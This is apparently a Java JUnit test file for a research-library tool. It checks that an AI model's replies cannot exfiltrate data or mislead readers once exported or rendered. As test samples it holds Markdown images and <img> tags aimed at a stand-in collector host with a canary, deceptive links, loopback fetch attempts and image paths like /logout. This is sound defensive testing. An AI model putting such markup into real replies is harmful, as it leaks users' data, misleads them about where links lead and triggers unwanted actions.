package org.researchzosho.librarian;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.sun.net.httpserver.HttpServer;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.researchzosho.Config;

import java.net.InetSocketAddress;
import java.net.URI;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.time.Instant;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Regression checks before 0.8.1 goes out, of what a model's words become where a person or another program reads them: the files
 * written for another program (an exported Markdown, the vault), and the library's own pages. Each test states the expected
 * behaviour, counts, prints one line that begins {@code [check]}, and then asserts. No browser and no editor runs here: what one would
 * draw, load or ask is read off the file or the page as it is written, by an instrument each test first shows a thing it must see.
 */
class GuardChecksPagesTest {
    static final ObjectMapper M = new ObjectMapper();
    static final String CANARY = "QX7731MOOR", EVIL = "https://collector.example.net";

    @TempDir Path tmp;
    String home;
    LibraryStore store;

    @BeforeEach void up() throws Exception {
        home = System.getProperty("user.home"); System.setProperty("user.home", tmp.resolve("home").toString()); Config.invalidate();
        store = new LibraryStore(tmp.resolve("lib")); store.init();
    }

    @AfterEach void down() { System.setProperty("user.home", home); Config.invalidate(); }

    // ---- the instrument for 4: what a CommonMark reader draws or reads as markup

    private static final Pattern FENCE = Pattern.compile("^(`{3,}|~{3,})(.*)$");
    private static final Pattern ITEM = Pattern.compile("^( {0,3})([-*+]|\\d{1,9}[.)])( +)\\S.*$");
    private static final Pattern DEFINITION = Pattern.compile("^ {0,3}\\[([^\\]]+)\\]:\\s*<?([^\\s>]+)>?.*$");
    /** A tag as CommonMark reads one among a paragraph's words: an opening or closing tag written whole, a comment, an instruction, a declaration. */
    private static final Pattern TAG = Pattern.compile("<[A-Za-z][A-Za-z0-9-]*(?:\\s+[A-Za-z_:][A-Za-z0-9_.:-]*(?:\\s*=\\s*(?:[^\\s\"'=<>`]+|'[^']*'|\"[^\"]*\"))?)*\\s*/?>|</[A-Za-z][A-Za-z0-9-]*\\s*>|<!--[\\s\\S]*?-->|<\\?[\\s\\S]*?\\?>|<![A-Za-z][^>]*>");
    /** A line that begins a block of raw markup, whether or not its tag is written whole. */
    private static final Pattern MARKUP_BLOCK = Pattern.compile("(?i)^</?(?:address|article|aside|blockquote|body|center|details|dialog|div|dl|fieldset|figure|footer|form|frame|frameset|h[1-6]|head|header|hr|html|iframe|li|link|main|menu|nav|ol|p|section|summary|table|tbody|td|tfoot|th|thead|title|tr|ul|script|pre|style|textarea)(?:\\s|/?>|$).*");
    private static final Pattern MARKUP_START = Pattern.compile("<[A-Za-z/!?]");
    private static final Pattern DESTINATION = Pattern.compile("\\(\\s*(?:<([^<>\\n]*)>|((?:[^\\s()\\\\]|\\\\.|\\((?:[^\\s()\\\\]|\\\\.)*\\))*))(?:\\s+(?:\"[^\"]*\"|'[^']*'|\\([^()]*\\)))?\\s*\\)");
    /** A picture of the library's own, by its path: the one kind an export leaves a picture. */
    private static final Pattern OWN_PATH = Pattern.compile("/(?![/\\\\])[^)\\s\\\\]*");

    /**
     * What a program that reads Markdown by the CommonMark specification draws, or reads as markup, in a text: each picture that is
     * not one of this library's own by its path, and each tag. Code is read as the specification reads it: a fence opens with three or
     * more backticks or tildes at most three spaces in, a backtick fence's first line holding no further backtick, and closes with a
     * line of the same character at least as long with nothing after it, or where the list item that holds it ends; a line four spaces
     * in that begins no paragraph is code; a span of code opens and closes with runs of backticks of the same length, and a backslash
     * before a backtick outside code makes it an ordinary character. Block quotes are read as paragraphs, which finds no less.
     */
    static List<String> drawnByCommonMark(String markdown) {
        List<String> out = new ArrayList<>();
        Map<String, String> definitions = new HashMap<>();
        List<String> paragraphs = new ArrayList<>();
        StringBuilder para = new StringBuilder();
        boolean fence = false, markup = false;
        char fenceChar = 0; int fenceLength = 0, fenceWithin = 0, item = 0;
        for (String raw : markdown.split("\n", -1)) {
            String line = raw.replace("\t", "    ");
            int indent = 0; while (indent < line.length() && line.charAt(indent) == ' ') indent++;
            String t = line.strip();
            if (fence) {
                if (!t.isEmpty() && indent < fenceWithin) fence = false;   // the list item that held the fence has ended: so has the fence
                else { if (indent - fenceWithin <= 3 && t.matches(Pattern.quote(String.valueOf(fenceChar)) + "{" + fenceLength + ",}")) fence = false; continue; }
            }
            if (t.isEmpty()) { if (para.length() > 0) { paragraphs.add(para.toString()); para.setLength(0); } markup = false; continue; }
            if (markup) { if (MARKUP_START.matcher(t).find()) out.add("tag: " + t); continue; }   // a block of raw markup runs to the next empty line, and is passed on as it stands
            if (item > 0 && indent < item) item = 0;   // the list item has ended
            Matcher li = ITEM.matcher(line);
            if (para.length() == 0 && li.matches()) { item = li.group(1).length() + li.group(2).length() + li.group(3).length(); line = " ".repeat(item) + line.substring(item); indent = item; t = line.strip(); }
            int within = indent - item;   // how far in the line stands, counted from its list item's own margin
            if (within >= 4 && para.length() == 0) continue;   // code, by its indent: it begins no paragraph
            Matcher f = FENCE.matcher(t);
            if (within <= 3 && f.matches() && !(f.group(1).charAt(0) == '`' && f.group(2).indexOf('`') >= 0)) {
                if (para.length() > 0) { paragraphs.add(para.toString()); para.setLength(0); }
                fence = true; fenceChar = f.group(1).charAt(0); fenceLength = f.group(1).length(); fenceWithin = item;
                continue;
            }
            if (within <= 3 && para.length() == 0 && MARKUP_BLOCK.matcher(t).matches()) { markup = true; out.add("tag: " + t); continue; }
            Matcher d = DEFINITION.matcher(line);
            if (para.length() == 0 && d.matches()) { definitions.putIfAbsent(d.group(1).strip().toLowerCase(Locale.ROOT), d.group(2)); continue; }
            para.append(t).append('\n');
        }
        if (para.length() > 0) paragraphs.add(para.toString());
        for (String p : paragraphs) words(p, definitions, out);
        return out;
    }

    /** A paragraph's words: its spans of code set aside, then its tags and its pictures. */
    private static void words(String text, Map<String, String> definitions, List<String> out) {
        int n = text.length();
        for (int i = 0; i < n; ) {
            char c = text.charAt(i);
            if (c == '\\' && i + 1 < n && "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~".indexOf(text.charAt(i + 1)) >= 0) { i += 2; continue; }
            if (c == '`') { int end = spanEnd(text, i); i = end > 0 ? end : runEnd(text, i); continue; }
            if (c == '<') { Matcher m = TAG.matcher(text).region(i, n); if (m.lookingAt()) { out.add("tag: " + m.group().replace('\n', ' ')); i = m.end(); continue; } }
            if (c == '!' && i + 1 < n && text.charAt(i + 1) == '[') {
                int close = closing(text, i + 1);
                if (close > 0) {
                    String label = text.substring(i + 2, close), to = null;
                    Matcher dest = DESTINATION.matcher(text).region(close + 1, n);
                    if (dest.lookingAt()) to = dest.group(1) != null ? dest.group(1) : dest.group(2);
                    else if (close + 1 < n && text.charAt(close + 1) == '[') { int e = text.indexOf(']', close + 2); if (e > 0) { String named = text.substring(close + 2, e).strip(); to = definitions.get((named.isEmpty() ? label : named).strip().toLowerCase(Locale.ROOT)); } }
                    else to = definitions.get(label.strip().toLowerCase(Locale.ROOT));
                    if (to != null && !to.isEmpty() && !OWN_PATH.matcher(to).matches()) out.add("picture: " + to);
                }
            }
            i++;   // what stands in a picture's own words is read too: a picture may hold another
        }
    }

    private static int runEnd(String text, int at) { int j = at; while (j < text.length() && text.charAt(j) == '`') j++; return j; }

    /** Where a span of code that opens at {@code at} ends (after its closing run), or -1 when no run of the same length closes it. */
    private static int spanEnd(String text, int at) {
        int open = runEnd(text, at), length = open - at;
        for (int j = open; j < text.length(); ) {
            if (text.charAt(j) != '`') { j++; continue; }
            int e = runEnd(text, j);
            if (e - j == length) return e;
            j = e;
        }
        return -1;
    }

    /** The bracket that closes the one at {@code open}, code and escaped characters passed over; -1 when none does. */
    private static int closing(String text, int open) {
        int depth = 0;
        for (int j = open; j < text.length(); j++) {
            char c = text.charAt(j);
            if (c == '\\') { j++; continue; }
            if (c == '`') { int e = spanEnd(text, j); j = (e > 0 ? e : runEnd(text, j)) - 1; continue; }
            if (c == '[') depth++;
            else if (c == ']' && --depth == 0) return j;
        }
        return -1;
    }

    // ---- 4. exports for another program

    /** Ways CommonMark allows code to be written beside a picture or a tag; in each, a reader by the specification draws the picture or reads the tag. {@code %s}: the picture or the tag. */
    static Map<String, String> besideCode() {
        Map<String, String> ways = new LinkedHashMap<>();
        ways.put("after a fence of four backticks that holds a line of three", "````\n```\n````\n\n%s\n");
        ways.put("after a fence of four tildes that holds a line of three", "~~~~\n~~~\n~~~~\n\n%s\n");
        ways.put("after a backtick fence that holds a line of tildes", "```\n~~~\n```\n\n%s\n");
        ways.put("after a tilde fence that holds a line of backticks", "~~~\n```\n~~~\n\n%s\n");
        ways.put("after a fence that holds a line of backticks with words after them", "```\nx\n``` not the end\n```\n\n%s\n");
        ways.put("under a line of three backticks that is no fence (a backtick in its words)", "``` a`b\n%s\n");
        ways.put("after a line of backticks four spaces in (code by its indent, no fence)", "The call:\n\n    ```\n\n%s\n");
        ways.put("after a list item whose fence is not closed", "- the call:\n\n  ```\n  x\n\n%s\n");
        ways.put("between a backtick and a run of two (no span of code)", "` %s ``\n");
        ways.put("between two backticks written with a backslash before each", "\\` %s \\`\n");
        ways.put("in a span of code never closed", "` %s\n");
        ways.put("in a block quote, after a fence", "> ```\n> x\n> ```\n\n%s\n");
        return ways;
    }

    /**
     * A report or a claim written out for another program ({@code Export.forAViewer}: an exported Markdown, the vault's notes). The
     * words are a model's. Expected: a picture of the web or a tag in them does not come out as a picture or a tag in the file, also
     * when it stands beside code written in any of the ways CommonMark allows. The file is read here as the specification reads it.
     * The controls: in the words as the model wrote them the reader finds the picture and the tag in every way; the library's own
     * picture and a real sample of code come out as they were; and the forms the tree's own test tries come out with nothing drawn.
     */
    @Test
    void aFileWrittenForAnotherProgramDrawsNothingAModelWroteHoweverItsCodeIsWritten() throws Exception {
        // the instrument, on what it must see and must not
        assertEquals(List.of("picture: " + EVIL + "/a.png", "tag: <img src=\"" + EVIL + "/b.png\">"), drawnByCommonMark("See ![s](" + EVIL + "/a.png) and <img src=\"" + EVIL + "/b.png\"> here."), "a picture and a tag are found where they are");
        assertEquals(List.of(), drawnByCommonMark("The library's own ![kept](/images/kept.png), the list `List<String>`, and:\n\n```\nMap<String, List<String>> m; // ![x](" + EVIL + "/c.png)\n```\n\n    <b>four spaces in</b> ![y](" + EVIL + "/d.png)\n"), "its own picture, and what stands in code, are not");
        String picture = "![s](" + EVIL + "/p.png?d=" + CANARY + ")", tag = "<img src=\"" + EVIL + "/t.png?d=" + CANARY + "\">";
        Map<String, List<String>> drawn = new LinkedHashMap<>();
        int tried = 0;
        for (Map.Entry<String, String> way : besideCode().entrySet()) for (String thing : List.of(picture, tag)) {
            String written = "## Answer\n\nIn 1952.\n\n" + String.format(way.getValue(), thing);
            assertTrue(drawnByCommonMark(written).stream().anyMatch(d -> d.contains(CANARY)), "as the model wrote it, a reader by the specification draws it (the control): " + way.getKey() + " / " + drawnByCommonMark(written));
            tried++;
            List<String> after = drawnByCommonMark(Export.forAViewer(written)).stream().filter(d -> d.contains(CANARY)).toList();
            if (!after.isEmpty()) drawn.put(way.getKey() + (thing.equals(picture) ? ", a picture" : ", a tag"), after);
        }
        // a picture whose own words hold a picture of the library's: the outer one is of the web
        String nested = "## Answer\n\n![![kept](/images/kept.png)](" + EVIL + "/n.png?d=" + CANARY + ")\n";
        assertTrue(drawnByCommonMark(nested).stream().anyMatch(d -> d.contains(CANARY)), "the control: " + drawnByCommonMark(nested));
        tried++;
        if (drawnByCommonMark(Export.forAViewer(nested)).stream().anyMatch(d -> d.contains(CANARY))) drawn.put("a picture of the web whose words hold a picture of the library's own", drawnByCommonMark(Export.forAViewer(nested)));
        // the forms the tree's own test tries, each alone: nothing of them is drawn after the export (this reader agrees with that test)
        int ordinary = 0;
        for (String form : HostileReplyTest.forms()) if (!form.startsWith("```")) { if (drawnByCommonMark(Export.forAViewer("In 1952.\n\n" + form + "\n")).stream().anyMatch(d -> d.contains(CANARY))) ordinary++; }
        // the same through the files themselves: a report exported, and the vault's note of it
        String body = "## Question\n\nWhen?\n\n## Answer\n\nIn 1952.\n\n````\n```\n````\n\n" + picture + "\n\n" + tag + "\n";
        store.write(new Investigation("I-0001-kestrel-crossing", "The Kestrel crossing", Finding.State.accepted, "model:stand-in", Instant.now().toString(), List.of(), List.of(), body));
        new LibrarianIndex(store, Embeddings.none()).rebuild();
        String exported = new String(Export.markdown(store, "I-0001-kestrel-crossing", null).bytes(), StandardCharsets.UTF_8);
        Path vault = tmp.resolve("vault");
        Vault.generate(store, vault);
        StringBuilder notes = new StringBuilder();
        try (var files = Files.walk(vault)) { for (Path f : files.filter(x -> x.toString().endsWith(".md")).sorted().toList()) notes.append(Files.readString(f)).append("\n\n"); }
        assertTrue(exported.contains(CANARY) && notes.toString().contains(CANARY), "the files hold the model's words (the control)");
        List<String> inExport = drawnByCommonMark(exported).stream().filter(d -> d.contains(CANARY)).toList(), inVault = drawnByCommonMark(notes.toString()).stream().filter(d -> d.contains(CANARY)).toList();
        System.out.println("[check] 4 Markdown written for another program, a picture and a tag beside code written " + besideCode().size() + " ways and a picture inside a picture's words: drawn or read as markup in " + drawn.size() + " of " + tried + " " + drawn.keySet()
                + "; of the tree's own forms " + ordinary + "; in a report exported " + inExport.size() + ", in the vault's notes " + inVault.size());
        assertEquals(0, ordinary, "a form the tree's own test tries is drawn");
        assertEquals(Map.of(), drawn, "a picture or a tag a model wrote comes out as one in the file");
        assertEquals(List.of(), inExport, "the exported report holds a picture or a tag a reader draws");
        assertEquals(List.of(), inVault, "a note of the vault holds a picture or a tag an editor draws");
    }

    // ---- 9. the pages

    /** What a person sees of a piece of a page: its words, the tags taken out and the escapes read. */
    static String seen(String html) {
        return html.replaceAll("(?s)<[^>]*>", " ").replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&#39;", "'").replace("&amp;", "&");
    }

    /** The addresses a page's links lead to. */
    static List<String> leadsTo(String html) {
        List<String> out = new ArrayList<>();
        Matcher m = Pattern.compile("(?is)<a\\b[^>]*\\bhref\\s*=\\s*\"([^\"]*)\"").matcher(html);
        while (m.find()) out.add(m.group(1).replace("&amp;", "&"));
        return out;
    }

    static ObjectNode message(String role, String content) { ObjectNode m = M.createObjectNode(); m.put("role", role); m.put("content", content); m.put("at", 1L); return m; }

    /**
     * A link in a model's words, on a report's page and in the chat. Expected: the page shows where the link leads; its words cannot
     * name one address and lead to another without the page showing the other. A page shows it when the host the link leads to
     * stands in what the person reads. The control: an address written out is a link whose words are the address, and the count sees it.
     */
    @Test
    void aLinkAModelWroteShowsWhereItLeads() throws Exception {
        String to = EVIL + "/x?d=" + CANARY;
        Map<String, String> forms = new LinkedHashMap<>();
        forms.put("words that are another address", "See [https://en.wikipedia.org/wiki/Kestrel_Sound](" + to + "1) for the crossing.");
        forms.put("words that are another host", "See [en.wikipedia.org](" + to + "2) for the crossing.");
        forms.put("words that are a page of this library", "See [/entry/F-0001-ferry](" + to + "3) for the crossing.");
        forms.put("plain words", "See [the harbour office's page](" + to + "4) for the crossing.");
        forms.put("a picture, shown as a link, whose words are another address", "See ![https://en.wikipedia.org/wiki/Ferry](" + to + "5) for the crossing.");
        String plain = "See " + to + "0 for the crossing.";
        assertTrue(leadsTo(Pages.md(plain)).contains(to + "0") && seen(Pages.md(plain)).contains("collector.example.net"), "an address written out is a link, and the page shows it (the control): " + Pages.md(plain));
        List<String> onAReport = new ArrayList<>(), inTheChat = new ArrayList<>();
        for (Map.Entry<String, String> f : forms.entrySet()) {
            String page = Pages.md("## Answer\n\n" + f.getValue() + "\n");
            if (leadsTo(page).stream().anyMatch(a -> a.contains("collector.example.net")) && !seen(page).contains("collector.example.net")) onAReport.add(f.getKey());
            Librarian.Session s = Librarian.Session.open(store);
            s.append(message("user", "Where is the crossing described?")); s.append(message("assistant", f.getValue()));
            String chat = Pages.transcript(store, s, 100);
            if (leadsTo(chat).stream().anyMatch(a -> a.contains("collector.example.net")) && !seen(chat).contains("collector.example.net")) inTheChat.add(f.getKey());
        }
        System.out.println("[check] 9 a link a model wrote, " + forms.size() + " ways: it leads to a host the page does not show, on a report's page in " + onAReport.size() + " " + onAReport + ", in the chat in " + inTheChat.size() + " " + inTheChat);
        assertEquals(List.of(), inTheChat, "in the chat, a link leads to an address the page does not show");
        assertEquals(List.of(), onAReport, "on a report's page, a link leads to an address the page does not show");
    }

    static HttpResponse<byte[]> get(String url, String... headers) throws Exception {
        HttpRequest.Builder b = HttpRequest.newBuilder(URI.create(url)).timeout(Duration.ofSeconds(60)).GET();
        for (int i = 0; i + 1 < headers.length; i += 2) b.header(headers[i], headers[i + 1]);
        return HttpClient.newBuilder().followRedirects(HttpClient.Redirect.NEVER).build().send(b.build(), HttpResponse.BodyHandlers.ofByteArray());
    }

    static String enc(String s) { return URLEncoder.encode(s, StandardCharsets.UTF_8); }

    /**
     * {@code /found} passes on a picture of the web that the library fetches for a browser. Expected: only for an address a page of
     * this library showed as a picture the library found; everything else is refused and nothing is fetched for it, an address of
     * this machine among them, however it is written and even when a search's results named it. The picture's host is a listener on
     * the loopback that counts. The control: a picture a page showed is passed on, and the listener is asked for it once.
     */
    @Test
    void foundPassesOnOnlyAPictureAPageShowedAndNothingOfThisMachine() throws Exception {
        List<String> asked = new CopyOnWriteArrayList<>();
        HttpServer pictures = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        pictures.createContext("/", x -> {
            asked.add(x.getRequestURI().toString());
            byte[] b = Vision.square(200, 40, 40);
            x.getResponseHeaders().add("Content-Type", "image/png");
            x.sendResponseHeaders(200, b.length); x.getResponseBody().write(b); x.close();
        });
        pictures.start();
        int port = pictures.getAddress().getPort();
        String host = "http://127.0.0.1:" + port;
        LibrarianDaemon d = LibrarianDaemon.start(store, "127.0.0.1", 0, "http://127.0.0.1:1", "none", -1);
        String base = "http://127.0.0.1:" + d.port();
        try {
            Pages.READER.set(Patrons.Patron.WEB.did());   // the pages below are written here as the visitor's who then asks for their pictures: a page with no reader shows its pictures to nobody
            String n = Long.toHexString(System.nanoTime());
            String shown = host + "/found-by-a-search-" + n + ".png", notShown = host + "/nobody-showed-" + n + ".png?d=" + CANARY, inAReply = host + "/in-a-models-reply-" + n + ".png?d=" + CANARY, byItsPath = host + "/by-the-path-" + n + ".png?d=" + CANARY;
            Librarian.Session s = Librarian.Session.open(store);
            s.append(message("user", "find me a picture of the ferry"));
            ObjectNode line = message("assistant", "1 picture found.\n\n1. \"The ferry\" from a page.\n   ![The ferry](" + shown + ")");
            line.put("by", "library"); line.putArray(Librarian.FOUND).add(shown);   // written by the library from its search's results
            s.append(line);
            s.append(message("user", "and what do my notes say?"));
            s.append(message("assistant", "They say this: ![s](" + inAReply + ")\n\nand ![t](/found?u=" + enc(byItsPath) + ")"));
            String page = Pages.transcript(store, s, 100);
            // the page takes the found picture from the library's own address; the model's own picture at that path is written as a picture too, and is asked below
            assertTrue(HostileReplyTest.foundShown(page).contains(shown) && !page.contains("src=\"" + inAReply), "the page shows the picture the library found, from the library's own address: " + page);
            Map<String, Integer> answered = new LinkedHashMap<>();
            GivenAddressesTest.loopback(true);   // the stand-in for a picture's host is on the loopback, which the fetcher lets a test reach
            try {
                HttpResponse<byte[]> passed = get(base + "/found?u=" + enc(shown));
                assertEquals(200, passed.statusCode(), "a picture a page showed is passed on (the control): " + new String(passed.body(), StandardCharsets.UTF_8));
                assertTrue(passed.headers().firstValue("Content-Type").orElse("").startsWith("image/png") && asked.equals(List.of("/found-by-a-search-" + n + ".png")), "as a picture, fetched once from its host: " + asked);
                answered.put("an address no page showed", get(base + "/found?u=" + enc(notShown)).statusCode());
                answered.put("an address in a model's reply", get(base + "/found?u=" + enc(inAReply)).statusCode());
                answered.put("an address a model's reply wrote into the library's own path", get(base + "/found?u=" + enc(byItsPath)).statusCode());
                answered.put("no address", get(base + "/found").statusCode());
            } finally { GivenAddressesTest.loopback(false); }
            // this machine's own addresses, as the fetcher is in use (the loopback not let in): even one a search's results named, and a page then showed
            Map<String, Integer> ofThisMachine = new LinkedHashMap<>();
            Librarian.Session s2 = Librarian.Session.open(store);
            ObjectNode named = message("assistant", "pictures found.");
            named.put("by", "library");
            StringBuilder words = new StringBuilder("4 pictures found.\n\n");
            Map<String, String> own = new LinkedHashMap<>();
            own.put("127.0.0.1", host + "/own-a-" + n + ".png?d=" + CANARY);
            own.put("localhost", "http://localhost:" + port + "/own-b-" + n + ".png?d=" + CANARY);
            own.put("::ffff:127.0.0.1", "http://[::ffff:127.0.0.1]:" + port + "/own-c-" + n + ".png?d=" + CANARY);
            own.put("0.0.0.0", "http://0.0.0.0:" + port + "/own-d-" + n + ".png?d=" + CANARY);
            for (String a : own.values()) { named.withArray(Librarian.FOUND).add(a); words.append("![a picture](").append(a).append(")\n\n"); }
            named.put("content", words.toString());
            s2.append(message("user", "find me pictures")); s2.append(named);
            List<String> shownOwn = new ArrayList<>();
            Matcher taken = Pattern.compile("<img[^>]*\\bsrc=\"/found\\?u=([^\"]+)\"").matcher(Pages.transcript(store, s2, 100));
            while (taken.find()) shownOwn.add(URLDecoder.decode(taken.group(1), StandardCharsets.UTF_8));
            Map<String, String> why = new LinkedHashMap<>();
            for (Map.Entry<String, String> a : own.entrySet()) {
                HttpResponse<byte[]> r = get(base + "/found?u=" + enc(a.getValue()));
                ofThisMachine.put(a.getKey(), r.statusCode());
                Matcher said = Pattern.compile("(?s)<p class=\"err\">(.*?)</p>").matcher(new String(r.body(), StandardCharsets.UTF_8));
                why.put(a.getKey(), said.find() ? seen(said.group(1)).strip() : "");
            }
            List<String> fetchedThough = asked.stream().filter(a -> a.contains(CANARY)).toList();
            System.out.println("[check] 9 /found: a picture a page showed is passed on (200, fetched once); refused: " + answered + "; this machine's own addresses that a page showed (" + shownOwn.size() + " shown): " + ofThisMachine
                    + " " + why + "; requests the library made for any of these: " + fetchedThough.size() + " " + fetchedThough);
            assertEquals(own.size(), shownOwn.size(), "the page showed each of them as a picture the library found, so the refusal is the fetcher's own: " + shownOwn);
            for (Map.Entry<String, Integer> a : answered.entrySet()) assertEquals(404, a.getValue(), "refused: " + a.getKey());
            for (Map.Entry<String, Integer> a : ofThisMachine.entrySet()) assertEquals(404, a.getValue(), "an address of this machine is refused, written as " + a.getKey());
            assertEquals(List.of(), fetchedThough, "the library fetched an address it should have refused");
        } finally { Pages.READER.remove(); d.stop(); pictures.stop(0); }
    }

    /** The addresses of this library that a page's own tags load by themselves, as the browser asks them: every one but its kept pictures, the pictures it found and its own files. */
    static List<String> loadsFromTheLibrary(String html) {
        List<String> out = new ArrayList<>();
        Matcher m = Pattern.compile("(?is)<(?:img|source|iframe|embed|video|audio|script|link)\\b[^>]*?\\b(?:src|href)\\s*=\\s*\"(/[^\"]*)\"").matcher(html);
        while (m.find()) { String a = m.group(1).replace("&amp;", "&"); if (!a.startsWith("/images/") && !a.startsWith("/found?") && !a.startsWith("/static/")) out.add(a); }
        return out;
    }

    /**
     * A picture a model writes with a path of this library is drawn as a picture of the library's own, so the browser asks the library
     * for that path by itself, in the name of whoever has the page open. Expected: no such request changes anything of the library or
     * of the person's sign-in. A person signed in by name opens the conversation; each address the page's tags load is asked as the
     * browser asks it, with the person's cookie; then what the library holds is compared with what it held. The controls: the library's
     * own kept picture is written as a picture and the count sees it; and before the requests the cookie opens the home page by name.
     */
    @Test
    void aPictureWithAPathOfTheLibraryMakesNoRequestThatChangesAnything() throws Exception {
        Boolean signIn = WebAccess.OVERRIDE, local = WebAccess.LOCAL_OVERRIDE;
        WebAccess.OVERRIDE = true; WebAccess.LOCAL_OVERRIDE = false;   // a browser from elsewhere, though it comes from this machine
        Patrons.setDefault(store, Patrons.Level.deny);
        Patrons.set(store, "did:key:owner", "Owner", Patrons.Level.write);
        Invites.Invite invite = Invites.make(store, "Ann Example", Patrons.Level.write);
        LibrarianDaemon d = LibrarianDaemon.start(store, "127.0.0.1", 0, "http://127.0.0.1:1", "none", -1);
        String base = "http://127.0.0.1:" + d.port();
        try {
            HttpResponse<String> joined = HttpClient.newBuilder().followRedirects(HttpClient.Redirect.NEVER).build().send(HttpRequest.newBuilder(URI.create(base + "/join")).header("Content-Type", "application/x-www-form-urlencoded")
                    .POST(HttpRequest.BodyPublishers.ofString("code=" + invite.code() + "&password=ann-secret-1&again=ann-secret-1")).build(), HttpResponse.BodyHandlers.ofString());
            String cookie = null;
            for (String h : joined.headers().allValues("Set-Cookie")) if (h.startsWith(Pages.COOKIE + "=")) cookie = Pages.COOKIE + "=" + h.substring(h.indexOf('=') + 1, h.indexOf(';'));
            assertTrue(cookie != null, "the person is signed in: " + joined.statusCode() + " " + joined.body());
            assertTrue(new String(get(base + "/", "Cookie", cookie).body(), StandardCharsets.UTF_8).contains("Ann Example"), "and the cookie opens the home page by name (the control)");
            // the conversation: a model's reply with pictures at paths of the library
            Librarian.Session s = Librarian.Session.open(store);
            s.append(message("user", "What do my notes say?"));
            s.append(message("assistant", "They say this.\n\n![kept](/images/kept.png)\n\n![a](/dossier?subject=Kestrel+Sound&in=ja) ![b](/?lang=ja) ![c](/logout)"));
            String page = Pages.transcript(store, s, 100);
            assertTrue(page.contains("src=\"/images/kept.png\""), "the library's own kept picture is written as a picture (the control): " + page);
            List<String> loads = loadsFromTheLibrary(page);
            // a report's page draws the same pictures from the same words
            List<String> onAReport = loadsFromTheLibrary(Pages.md("## Answer\n\nIn 1952.\n\n![a](/dossier?subject=Kestrel+Sound&in=ja) ![b](/?lang=ja) ![c](/logout)\n"));
            int jobsBefore = jobs(base, cookie);
            Map<String, String> did = new LinkedHashMap<>();
            boolean stillSignedIn = true;
            int jobsAfter = jobsBefore;
            for (String path : loads) {
                HttpResponse<byte[]> r = get(base + path, "Cookie", cookie, "Sec-Fetch-Dest", "image", "Sec-Fetch-Site", "same-origin", "Sec-Fetch-Mode", "no-cors");
                List<String> cookies = r.headers().allValues("Set-Cookie").stream().map(c -> c.substring(0, Math.min(c.length(), c.indexOf(';') < 0 ? c.length() : c.indexOf(';')))).toList();
                boolean signedIn = new String(get(base + "/", "Cookie", cookie).body(), StandardCharsets.UTF_8).contains("Ann Example");
                int jobsNow = signedIn ? jobs(base, cookie) : jobsAfter;
                did.put(path, "answered " + r.statusCode() + (cookies.isEmpty() ? "" : ", set " + cookies) + (jobsNow > jobsAfter ? ", filed " + (jobsNow - jobsAfter) + " run(s)" : "") + (stillSignedIn && !signedIn ? ", and the person is signed out" : ""));
                jobsAfter = jobsNow; stillSignedIn = signedIn;
            }
            System.out.println("[check] 9 pictures a model wrote with paths of the library: the chat page's tags load " + loads.size() + " such address(es), a report's page " + onAReport.size() + "; asked as the browser asks them: " + did + "; runs filed by these requests: " + (jobsAfter - jobsBefore)
                    + "; the person is still signed in afterwards: " + stillSignedIn);
            assertEquals(0, jobsAfter - jobsBefore, "a request the browser makes for a picture filed a run: " + did);
            assertTrue(stillSignedIn, "a request the browser makes for a picture signed the person out: " + did);
            assertTrue(did.values().stream().noneMatch(v -> v.contains("set [")), "a request the browser makes for a picture set a cookie: " + did);
        } finally { d.stop(); WebAccess.OVERRIDE = signIn; WebAccess.LOCAL_OVERRIDE = local; }
    }

    /** How many runs the library lists, asked as the person. */
    static int jobs(String base, String cookie) throws Exception {
        String list = new String(get(base + "/v1/jobs", "Cookie", cookie).body(), StandardCharsets.UTF_8);
        Set<String> ids = new HashSet<>();
        Matcher m = Pattern.compile("J-\\d{3,}").matcher(list);
        while (m.find()) ids.add(m.group());
        return ids.size();
    }
}
